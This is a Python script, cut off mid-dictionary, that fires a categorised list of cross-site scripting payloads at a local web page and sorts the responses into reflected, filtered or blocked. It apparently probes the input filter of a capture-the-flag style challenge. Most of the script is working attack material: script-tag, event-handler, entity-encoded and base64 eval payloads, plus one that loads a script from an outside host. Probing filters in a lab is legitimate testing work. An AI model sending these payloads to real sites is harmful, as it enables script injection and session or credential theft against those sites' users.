import requests
import urllib.parse
import urllib3
import time

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

base_url = "http://127.0.0.1:33152/page"

# Test payloads organized by category
xss_payloads = {
    "Basic Script Tags": [
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        "<script>console.log(1)</script>",
        "<SCRIPT>alert(1)</SCRIPT>",
        "<script src=//example.com/x.js></script>"
    ],
    
    "Event Handlers": [
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert('XSS')>",
        "<body onload=alert(1)>",
        "<svg onload=alert(1)>",
        "<iframe onload=alert(1)></iframe>",
        "<a href=# onclick=alert(1)>click</a>",
        "<img src=x onerror=prompt(1)>",
        "<div onmouseover=alert(1)>hover</div>"
    ],
    
    "HTML Tags": [
        "<iframe src=javascript:alert(1)></iframe>",
        "<svg><script>alert(1)</script></svg>",
        "<img src='x:alert' onerror='XSS'>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>xss</marquee>",
        "<embed src=data:text/html,<script>alert(1)</script>>",
        "<object data=javascript:alert(1)></object>"
    ],
    
    "Encoded Vectors": [
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",  # HTML entities
        "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>",  # Hex entities
        "<svg/onload=alert(1)>",  # No spaces
        "<svg onload=alert`1`>",  # Backticks
        "<iframe/src='javascript:alert(1)'></iframe>",  # Mixed quotes
    ],
    
    "Obfuscated": [
        "<img src=x onerror='alert(1)'>",  # Single quotes
        '<img src=x onerror="alert(1)">',  # Double quotes
        "<svg><animate onbegin=alert(1) attributeName=x></svg>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",  # base64
        "<img src=x onerror=window['alert'](1)>",  # Property access
        "<marquee loop=1 width=0 onfinish=alert(1)>x</marquee>"
    ]
}

# Track results by category
results = {
    "fully_blocked": [],
    "fully_reflected": [],
    "partially_filtered": [],
    "filtered_empty": []
}

print("=" * 80)
print("XSS FILTER ANALYSIS - http://127.0.0.1:33152/page")
print("Testing various XSS vectors with 'name' parameter")
print("=" * 80)
print()

# Test each category
for category, payloads in xss_payloads.items():
    print(f"\n{'=' * 80}")
    print(f"[CATEGORY] {category}")
    print(f"{'=' * 80}")
    
    for payload in payloads:
        # Encode for URL
        encoded_payload = urllib.parse.quote(payload, safe='')
        
        try:
            # Send request
            url = f"{base_url}?name={encoded_payload}"
            response = requests.get(url, timeout=10, verify=False)
            response_text = response.text
            
            # Check if payload is reflected
            if payload in response_text:
                print(f"\n[+] FULLY REFLECTED: {payload}")
                print(f"    Status: {response.status_code}")
                results["fully_reflected"].append({
                    "category": category,
                    "payload": payload,
                    "status": response.status_code
                })
            elif payload.lower() in response_text.lower():
                print(f"\n[-] PARTIALLY FILTERED (case modified): {payload}")
                print(f"    Status: {response.status_code}")
                results["partially_filtered"].append({
                    "category": category,
                    "payload": payload,
                    "status": response.status_code,
